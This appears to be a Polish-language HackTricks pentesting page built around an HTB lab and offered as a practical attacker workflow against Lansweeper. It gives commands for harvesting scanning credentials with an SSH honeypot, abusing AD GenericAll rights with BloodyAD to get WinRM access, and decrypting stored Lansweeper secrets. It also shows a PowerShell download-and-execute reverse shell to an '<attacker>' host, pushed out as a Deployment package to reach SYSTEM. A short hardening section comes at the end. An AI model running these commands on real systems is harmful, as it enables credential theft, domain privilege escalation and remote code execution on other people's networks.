# Lansweeper Abuse: Pozyskiwanie danych uwierzytelniających, deszyfrowanie sekretów i RCE przez Deployment

{{#include ../../banners/hacktricks-training.md}}

Lansweeper to platforma do wykrywania i inwentaryzacji zasobów IT, często wdrażana w systemie Windows i integrowana z Active Directory. Dane uwierzytelniające skonfigurowane w Lansweeper są używane przez jego silniki skanujące do uwierzytelniania zasobów za pośrednictwem protokołów takich jak SSH, SMB/WMI i WinRM. Błędne konfiguracje często umożliwiają:

- Przechwytywanie danych uwierzytelniających przez przekierowanie celu skanowania do hosta kontrolowanego przez atakującego (honeypot)
- Wykorzystanie AD ACLs ujawnionych przez grupy powiązane z Lansweeper w celu uzyskania zdalnego dostępu
- Deszyfrowanie sekretów skonfigurowanych w Lansweeper na hoście (connection strings i przechowywane dane uwierzytelniające skanowania)
- Wykonywanie kodu na zarządzanych endpointach za pośrednictwem funkcji Deployment (często z uprawnieniami SYSTEM)

Ta strona podsumowuje praktyczne workflow atakującego i polecenia służące do wykorzystania tych zachowań podczas engagementów.

## 1) Pozyskiwanie danych uwierzytelniających skanowania za pomocą honeypot (przykład SSH)

Pomysł: utwórz Scanning Target wskazujący na Twój host i przypisz do niego istniejące Scanning Credentials. Po uruchomieniu skanowania Lansweeper spróbuje uwierzytelnić się za pomocą tych danych, a Twój honeypot je przechwyci.<sup>[[1]](#references)</sup>

Przegląd kroków (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (lub Single IP) = Twój adres IP VPN
- Skonfiguruj port SSH na osiągalny (np. 2022, jeśli 22 jest zablokowany)
- Wyłącz harmonogram i zaplanuj ręczne uruchomienie
- Scanning → Scanning Credentials → upewnij się, że istnieją dane uwierzytelniające Linux/SSH; przypisz je do nowego celu (w razie potrzeby włącz wszystkie)
- Kliknij „Scan now” na celu
- Uruchom honeypot SSH i pobierz próbę użycia nazwy użytkownika/hasła

Przykład z użyciem sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Zweryfikuj przechwycone poświadczenia względem usług DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Uwagi
- Działa podobnie w przypadku innych protokołów, gdy można wymusić, aby scanner łączył się z naszym listenerem (honeypoty SMB/WinRM itp.). SSH jest często najprostszym rozwiązaniem.
- Wiele scannerów identyfikuje się za pomocą charakterystycznych bannerów klienta (np. RebexSSH) i wykonuje nieszkodliwe polecenia (uname, whoami itp.).

## 2) Nadużycie AD ACL: uzyskanie zdalnego dostępu przez dodanie siebie do grupy app-admin

Użyj BloodHound do wyliczenia efektywnych uprawnień skompromitowanego konta. Częstym znaleziskiem jest grupa powiązana ze scannerem lub aplikacją (np. „Lansweeper Discovery”) posiadająca GenericAll nad uprzywilejowaną grupą (np. „Lansweeper Admins”). Jeśli uprzywilejowana grupa jest również członkiem „Remote Management Users”, WinRM stanie się dostępny po dodaniu siebie do tej grupy.<sup>[[1]](#references)[[5]](#references)</sup>

Przykłady zbierania danych:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Wykorzystanie GenericAll na grupie za pomocą BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Następnie uzyskaj interaktywną powłokę:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Wskazówka: Operacje Kerberos są zależne od czasu. Jeśli napotkasz KRB_AP_ERR_SKEW, najpierw zsynchronizuj czas z kontrolerem domeny:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Odszyfrowywanie sekretów skonfigurowanych w Lansweeper

Na serwerze Lansweeper witryna ASP.NET zazwyczaj przechowuje zaszyfrowany ciąg połączenia oraz klucz symetryczny używany przez aplikację. Przy odpowiednim dostępie lokalnym można odszyfrować ciąg połączenia z bazą danych, a następnie wyodrębnić zapisane poświadczenia skanowania.<sup>[[1]](#references)</sup>

Typowe lokalizacje:
- Konfiguracja witryny: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Klucz aplikacji: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Użyj SharpLansweeperDecrypt, aby zautomatyzować odszyfrowywanie i zrzucanie zapisanych poświadczeń:<sup>[[3]](#references)</sup>
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Oczekiwany wynik zawiera szczegóły połączenia z bazą danych oraz poświadczenia skanowania w postaci plaintext, takie jak konta Windows i Linux używane w całym środowisku. Często mają one podwyższone uprawnienia lokalne na hostach domenowych:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Wykorzystaj odzyskane dane uwierzytelniające do skanowania Windows w celu uzyskania uprzywilejowanego dostępu:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

As a member of “Lansweeper Admins”, interfejs webowy udostępnia sekcje Deployment i Configuration. W sekcji Deployment → Deployment packages można tworzyć pakiety uruchamiające dowolne polecenia na wskazanych assetach. Wykonanie jest realizowane przez usługę Lansweeper z wysokimi uprawnieniami, co zapewnia code execution jako NT AUTHORITY\SYSTEM na wybranym hoście.<sup>[[1]](#references)</sup>

Najważniejsze kroki:
- Utwórz nowy pakiet Deployment uruchamiający one-liner PowerShell lub cmd (reverse shell, add-user itd.).
- Wskaż żądany asset (np. DC/host, na którym działa Lansweeper) i kliknij Deploy/Run now.
- Odbierz shell jako SYSTEM.

Przykładowe payloady (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Działania wdrożeniowe są głośne i pozostawiają logi w Lansweeper oraz logach zdarzeń systemu Windows. Używaj ich rozważnie.

## Wykrywanie i hardening

- Ogranicz lub usuń anonimowe enumeracje SMB. Monitoruj RID cycling oraz anomalous access do udziałów Lansweeper.
- Kontrola ruchu wychodzącego: blokuj lub ściśle ogranicz wychodzące połączenia SSH/SMB/WinRM z hostów skanujących. Generuj alerty dla niestandardowych portów (np. 2022) oraz nietypowych bannerów klienta, takich jak Rebex.
- Chroń `Website\\web.config` oraz `Key\\Encryption.txt`. Przenieś sekrety do vaulta i rotuj je po exposure. Rozważ konta usługowe z minimalnymi uprawnieniami oraz gMSA, jeśli jest to możliwe.
- Monitorowanie AD: generuj alerty dotyczące zmian w grupach powiązanych z Lansweeper (np. „Lansweeper Admins”, „Remote Management Users”) oraz zmian ACL przyznających GenericAll/Write membership w uprzywilejowanych grupach.
- Audytuj tworzenie, zmiany i wykonywanie pakietów Deployment; generuj alerty dla pakietów uruchamiających cmd.exe/powershell.exe lub nawiązujących nieoczekiwane połączenia wychodzące.

## Powiązane tematy
- Enumeracja SMB/LSA/SAMR oraz RID cycling
- Kerberos password spraying oraz kwestie związane z clock skew
- Analiza ścieżek BloodHound dla grup application-admin
- Użycie WinRM oraz lateral movement

## Referencje
- [1] [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
